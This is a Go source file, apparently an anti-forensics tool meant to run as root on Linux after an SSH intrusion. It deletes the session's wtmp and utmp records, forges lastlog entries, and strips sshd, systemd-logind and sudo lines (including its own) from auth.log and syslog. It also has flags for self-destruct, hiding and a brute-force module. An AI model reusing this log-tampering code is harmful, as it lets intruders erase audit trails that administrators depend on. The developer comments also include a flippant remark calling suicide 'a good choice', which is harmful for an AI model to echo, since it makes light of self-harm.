package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	authlog "test/AUTHLOG"
	bf "test/BF"
	check "test/CHECK"
	lastlog "test/LASTLOG"
	utmp "test/UTMP"
	vars "test/VARS"
)

// When I wrote this Code
// Only God and I
// Knew how it worked
// Now only God knows it !
// Good luck
// What am i doing with my life? :(
// What the fuck i have writen here?
// That file/ folder supposed to be a test file not a productive
// Log Lurnal of 28 Jun 2024 i slpit the project in multipple files
// I am scared for two things first of all if the entire pc crases
// and secondly and most the terrifing if i summon Baphomet

// UPDATE i run the UTMP Function and it workted (tears of accomplisment spread through my cheeks)
// Second UPDATE same day. Evrything crushes.

// 2 Jul 20 After a day off due to explosing diarrea i return to spread some tears againe

// Something magic happent. Somehow something workes. BUT copy paste comments makes errors. WTF?

// My supervisor just said to me that everything that i have wrote doesent matters.

// suicide seems a good choice

var indexToDel int64
var count int64
var ProxyIp [16]byte

// const LASTLOG_FILE = "/var/log/lastlog"
// const LINE_LENGTH = 292 // Size of each entry in lastlog (defined in /usr/include/lastlog.h)

var play bool = true

func init() {
	// Initialize flags

	flag.BoolVar(&vars.Destr, "d", false, "Self Destruct")
	flag.BoolVar(&vars.Combo, "c", false, "Combo Entry")
	flag.BoolVar(&vars.HideMe, "hm", true, "Hide My Shit")
	flag.StringVar(&vars.BrFile, "f", "", "Data File")
	flag.StringVar(&vars.Host, "h", "192.168.23.23", "Server Host")
	flag.StringVar(&vars.Port, "p", "", "Server Port")
	flag.StringVar(&vars.User, "u", "", "Server Username")
	flag.StringVar(&vars.Pass, "pa", "", "Server Pass")
	flag.StringVar(&vars.ConnectedUser, "cu", "ubuntu", "Connected User To Delete")
	flag.IntVar(&vars.Threads, "t", 3, "Threads")

}

func main() {
	// history.DelHistory()
	if false {
		if vars.HideMe {
			euid := os.Geteuid()
			if euid == 0 {
				// connectedUser := flag.String("u", "ubuntu", "Connected User")
				flag.Parse()

				utmp.ClearUTMP(vars.Host, vars.ConnectedUser)

				ConvertIPToBytearray(&vars.Host)
				x, _ := parceDataUtmpFile(vars.ConnectedUser)

				lastlog.ChangeLastLog(&vars.Host, &x, &vars.ConnectedUser)
				// /////////////////////////////////////////////////////////////////////////////
				sessionStart := int(x.Time.Sec)
				sessionStop := int(x.TimeEnd.Sec)
				start, stop := authlog.GetTimeStamps(sessionStart, sessionStop)
				// err := deleteLineAuthLog(AUTH_LOG, start, stop,sIP)
				sessionID, err := authlog.DeleteLineAuthLog(vars.AUTH_LOG, start, stop, &vars.Host)
				check.Check("Delete Auth Log ", err)
				fmt.Println(sessionID)

				patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, vars.SYSLOG)
				if err != nil {
					fmt.Println("Errpr", err)
				}
				ex, err := os.Executable()
				if err != nil {
					panic(err)
				}

				exPath := filepath.Dir(ex)
				patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
				fmt.Println(patternDeleteSudoExec)

				check.Check("Error on delete Line Auth Log", err)
				err = authlog.DeleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, vars.AUTH_LOG)
				if err != nil {
					fmt.Println(err)
				}
			}
		}
		if false {
			bf.Bf()
		}
	}
}

func ConvertIPToBytearray(ip *string) {

	splitIP := strings.Split(*ip, ".")
	for n, s := range splitIP {
		i, err := strconv.Atoi(s)
		if err != nil {
			fmt.Println(err, "asd")
		}

		// To handle both 32-bit and 64-bit architectures, you can use int32 or int64
		var number8 int8 = int8(i) // Convert to int64 for this example

		buffer := new(bytes.Buffer)
		err = binary.Write(buffer, binary.BigEndian, number8)
		if err != nil {
			fmt.Println("binary.Write failed:", err)
		}
		finalByteArray := buffer.Bytes()
		ProxyIp[n] = finalByteArray[0]
	}
}

// This fuck checks the WTMP file
// WTMP holds the last data
func parceDataUtmpFile(connectedUser string) (vars.DataToInfl, error) {

	count = 0
	// sizeUtmp := int64(binary.Size(Utmp{}))
	// fmt.Println(sizeUtmp)
	file, err := os.Open(vars.WTMP)
	if err != nil {
		fmt.Printf("Error opening utmp file: %v\n", err)
		return vars.DataToInfl{}, err
	}
	defer file.Close()

	DtIN := []vars.DataToInfl{}
	for {

		var record vars.Utmp
		err := binary.Read(file, binary.LittleEndian, &record)
		if err != nil {
			break
		}

		name := ""

		for _, j := range record.User[:] {
			if j > 0 {
				name = name + string(j)
			}
		}
		if name == connectedUser && record.Type == 0x7 {

			DtIN = append(DtIN, vars.DataToInfl{User: string(record.User[:]),
				Pid: record.Pid,
				Time: vars.TimeVal{
					Sec:  record.Time.Sec,
					Usec: record.Time.Usec},
				TimeEnd: vars.TimeVal{},
				AddrV6:  record.AddrV6,
				Device:  record.Device})
			indexToDel = count
			// fmt.Println(DtIN)

		} else if record.Type == 0x8 {
			if len(DtIN)-1 > -1 {
				if DtIN[len(DtIN)-1].Pid == record.Pid {
					fmt.Println("MESA MESA")
					DtIN[len(DtIN)-1].Time.Sec = record.Time.Sec
					DtIN[len(DtIN)-1].Time.Usec = record.Time.Usec
				}
			}
		}
		count += 1
	}

	//////////////////////////////////////////////////////////////////////////////

	if play {
		err = deleteBytesFromFile(vars.WTMP, indexToDel*384, 384)
		if err != nil {
			fmt.Println(err)
		}
	}
	//////////////////////////////////////////////////////////////////////////////
	slices.Reverse(DtIN)
	if len(DtIN) > 1 {
		DtIN = DtIN[1:]
		dess := vars.Dessisions{}
		for i, d := range DtIN {
			if connectedUser == strings.TrimRight(d.User, "\x00") && strings.Contains(strings.TrimRight(string(d.Device[:]), "\x00"), "pts") {
				dess.Dessision = append(dess.Dessision, i)
			}
		}
		finalDtI := vars.DataToInfl{}

		if len(dess.Dessision) > 0 {
			finalDtI = DtIN[dess.Dessision[0]]
		}
		return finalDtI, nil
	} else {
		return vars.DataToInfl{}, nil
	}

}

func deleteBytesFromFile(filePath string, start int64, count int64) error { //wtmp 24*384 384
	// Read the file contents
	data, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Check if the range to delete is valid
	fileSize := int64(len(data))
	if start < 0 || start >= fileSize || start+count > fileSize {
		return fmt.Errorf("invalid range")
	}

	// Remove the bytes from the slice
	copy(data[start:], data[start+count:])

	// Truncate the file
	err = os.Truncate(filePath, fileSize-count)
	if err != nil {
		return err
	}

	// Write the modified data back to the file
	err = os.WriteFile(filePath, data[:fileSize-count], 0644)
	if err != nil {
		return err
	}

	return nil
}

// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// func deleteSessionAndSudoeSyslogAuthlog(pattern string, FileToDelLines string) error {
// 	file, err := os.ReadFile(FileToDelLines)
// 	if err != nil {
// 		return err
// 	}
// 	stringSliceOfLogFile := strings.Split(string(file), "\n")
// 	fmt.Println(pattern)
// 	re := regexp.MustCompile(pattern)
// 	linesToDel := []int{}
// 	for i, j := range stringSliceOfLogFile {
// 		match := re.MatchString(j)
// 		if match {
// 			linesToDel = append(linesToDel, i)
// 			fmt.Println(j, "  ", i)

// 		}
// 	}
// 	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
// 	for _, j := range linesToDel {
// 		fmt.Println(j, "<<<<")
// 		stringSliceOfLogFile = remove(stringSliceOfLogFile, j)
// 	}

// 	err = CopyFile(FileToDelLines, stringSliceOfLogFile)

// 	return nil

// }

// func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string, ip *string) (string, error) {
// 	file, err := os.ReadFile(filePath)
// 	if err != nil {
// 		return "", err
// 	}

// 	stringSliceOfAothLog := strings.Split(string(file), "\n")

// 	matchStartID := ""
// 	for i, j := range stringSliceOfAothLog {
// 		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStart[1]) {
// 			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
// 			matches := pattern.FindAllStringSubmatch(j, -1)
// 			matchStartID = matches[0][1] // ID
// 			indexToStartManipulate = i
// 			fmt.Println(j, matches[0][1], i, "AAAAAA")
// 			break
// 		}
// 	}

// 	matchStopID := ""
// 	for i, j := range stringSliceOfAothLog[indexToStartManipulate:] {
// 		if strings.Contains(j, "sshd") && strings.Contains(j, *ip) && strings.Contains(j, SplitTimeStop[1]) {
// 			pattern := regexp.MustCompile(`sshd\[(\d+)\]`)
// 			matches := pattern.FindAllStringSubmatch(j, -1)
// 			matchStopID = matches[0][1]
// 			fmt.Println(j, matches[0][1], i, "XAXAXAXAXAX")
// 			break
// 		}
// 	}

// 	IntlinesToDel := []int{}
// 	StringLinesToDel := []string{}
// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStartID, false)
// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID, false)
// 	// GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStopID)

// 	for _, j := range stringSliceOfAothLog[indexToStartForSystemLog:] {
// 		pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]: (New session|Session \d+ )`)
// 		matches := pattern.FindAllStringSubmatch(j, -1)

// 		if len(matches) > 0 {
// 			pattern := regexp.MustCompile(`systemd-logind\[(\d+)\]`)
// 			matches := pattern.FindAllStringSubmatch(j, -1)
// 			systemdLogInd = matches[0][1]
// 			pattern = regexp.MustCompile(`New session (\d+)`)
// 			matchesSession := pattern.FindStringSubmatch(j)
// 			fmt.Println(matchesSession, "AAAAA")
// 			sessionId = matchesSession[1]
// 			break
// 		}
// 	}
// 	patternSystemLogInd := fmt.Sprintf(`^.*systemd-logind\[%s\].*(Session %s logged out|Removed session %s|New session %s)`, systemdLogInd, sessionId, sessionId, sessionId)
// 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, patternSystemLogInd, true)

// 	sort.Sort(sort.Reverse(sort.IntSlice(IntlinesToDel)))
// 	fmt.Printf("Final Data: StartLogin %s, EndLogin: %s systemLoginInId :%s, Lines To Del %v, Session ID ,%s \n", matchStartID, matchStopID, systemdLogInd, IntlinesToDel, sessionId)
// 	for _, index := range IntlinesToDel {
// 		stringSliceOfAothLog = remove(stringSliceOfAothLog, index)
// 	}

// 	err = CopyFile(AUTH_LOG, stringSliceOfAothLog)
// 	check("Error on Copy file at AuthLog", err)
// 	return sessionId, nil
// 	// return nil
// }

// func CopyFile(filepath string, strings []string) error {

// 	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
// 	check("Error on Open File", err)
// 	defer file.Close()

// 	for _, j := range strings {
// 		_, err := file.WriteString(j + "\n")
// 		check("Error on Writing File ", err)
// 	}

// 	fmt.Println("All strings written to file successfully")
// 	return nil
// }

// func GetIndexesToDelete(stringSliceOfAothLog *[]string, IntlinesToDel *[]int, StringLinesToDel *[]string, matchString string, getSession bool) {

// 	re := regexp.MustCompile(matchString)
// 	for i, j := range (*stringSliceOfAothLog)[indexToStartManipulate:] {
// 		if re.MatchString(j) {

// 			(*IntlinesToDel) = append((*IntlinesToDel), i+indexToStartManipulate)
// 			(*StringLinesToDel) = append((*StringLinesToDel), j)
// 			if strings.Contains(j, "Accepted password for") {
// 				indexToStartForSystemLog = i + indexToStartManipulate
// 			}
// 		}
// 	}
// }

// func remove(slice []string, index int) []string {
// 	if index < 0 || index >= len(slice) {
// 		fmt.Println("Index out of range")
// 		return slice
// 	}
// 	return append(slice[:index], slice[index+1:]...)
// }

// func getTimeStamps(sessionStart, sessionStop int) ([]string, []string) {
// 	tStart := time.Unix(int64(sessionStart), 0).UTC()
// 	localTimeStart := tStart.Local()
// 	SplitTimeStart := strings.Split(localTimeStart.Format("2006-01-02 15:04:05"), " ")

// 	tStop := time.Unix(int64(sessionStop), 0).UTC()
// 	localTimeStop := tStop.Local()
// 	SplitTimeStop := strings.Split(localTimeStop.Format("2006-01-02 15:04:05"), " ")
// 	fmt.Println(SplitTimeStart, SplitTimeStop)

// 	return SplitTimeStart, SplitTimeStop

// }

// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// ///////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// /////////////////////////////////////<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
// func ChangeLastLog(sIP *string, x *DataToInfl, connectedUser *string) {

// 	file, err := os.Open(LASTLOG_FILE)
// 	if err != nil {
// 		fmt.Printf("Error opening %s: %v\n", LASTLOG_FILE, err)
// 		return
// 	}
// 	defer file.Close()

// 	// Get file size
// 	fileInfo, err := file.Stat()
// 	if err != nil {
// 		fmt.Printf("Error getting file info: %v\n", err)
// 		return
// 	}
// 	fileSize := fileInfo.Size()

// 	// Calculate number of entries
// 	numEntries := int(fileSize / LINE_LENGTH)

// 	// Read each entry
// 	for i := 0; i < numEntries; i++ {
// 		var ll Lastlog

// 		// Seek to the position of the current entry
// 		offset := int64(i * LINE_LENGTH)
// 		_, err := file.Seek(offset, 0)
// 		if err != nil {
// 			fmt.Printf("Error seeking to offset %d: %v\n", offset, err)
// 			return
// 		}

// 		// Read the entry
// 		err = binary.Read(file, binary.LittleEndian, &ll)
// 		if err != nil {
// 			fmt.Printf("Error reading lastlog entry: %v\n", err)
// 			return
// 		}

// 		if ll.LastLoginTime != 0 {
// 			lastLogin := time.Unix(int64(ll.LastLoginTime), 0)

// 			u, err := user.LookupId(strconv.Itoa(i))
// 			if err != nil {
// 				fmt.Printf("Error getting username for entry %d: %v\n", i, err)
// 				continue
// 			}

// 			fmt.Printf("Username: %s, Last Login: %s\n", u.Name, lastLogin.String())
// 			if u.Name == *connectedUser {
// 				fileRepl, err := os.OpenFile(LASTLOG_FILE, os.O_RDWR, 0644)
// 				if err != nil {
// 					fmt.Println(err)
// 				}
// 				defer fileRepl.Close()
// 				// x.Device
// 				changeTimestamp(i, fileRepl, &x.Time.Sec)
// 				changeDevice(i, fileRepl, &x.Device)
// 				changeIP(i, fileRepl, &x.AddrV6)
// 			}

// 		}
// 	}

// }

// // wine             pts/7    192.192.192.192  Παρ Μαρ  5 09:40:00 +0200 2021whoami
// func changeIP(offset int, fileRepl *os.File, sIP *[16]byte) {
// 	var asciiBytes []byte
// 	strIP := ""
// 	for _, j := range sIP {
// 		if j != 0 {
// 			intValue := int(j)
// 			strValue := strconv.Itoa(intValue)
// 			strIP += strValue + "."
// 		}
// 	}

// 	strIP = strings.TrimRight(strIP, ".")
// 	if len(strIP) == 0 {
// 		asciiBytes = (*sIP)[:]
// 	} else {
// 		for i := 0; i < len(strIP); i++ {
// 			asciiBytes = append(asciiBytes, (strIP)[i])
// 		}
// 	}
// 	offsetStart := int64(offset) * int64(292)
// 	_, errfile := fileRepl.WriteAt(asciiBytes, offsetStart+36)
// 	if errfile != nil {
// 		fmt.Println(errfile)
// 	}
// }

// func changeDevice(i int, fileRepl *os.File, device *[32]byte) {
// 	data := []byte{}
// 	for _, d := range device {
// 		if d != 0 {
// 			data = append(data, d)
// 		}
// 	}

// 	if len(data) == 0 {
// 		for i := 0; i <= 31; i++ {
// 			data = append(data, 0)
// 		}
// 	}
// 	// data = []byte{112, 116, 115, 47, 57}
// 	offsetStart := int64(i) * int64(292)
// 	_, errfile := fileRepl.WriteAt(data, offsetStart+4)

// 	if errfile != nil {
// 		fmt.Println(errfile)
// 	}

// }

// func changeTimestamp(i int, fileRepl *os.File, timeToChange *int32) {
// 	offsetStart := int64(i) * int64(292)
// 	fmt.Println(*timeToChange)
// 	data := make([]byte, 4) // Assuming 32-bit integer (4 bytes)
// 	binary.LittleEndian.PutUint32(data, uint32((*timeToChange)))
// 	_, errfile := fileRepl.WriteAt(data, offsetStart)

// 	if errfile != nil {
// 		fmt.Println(errfile, "<<<<<<<<<<<<<")
// 	}
// }
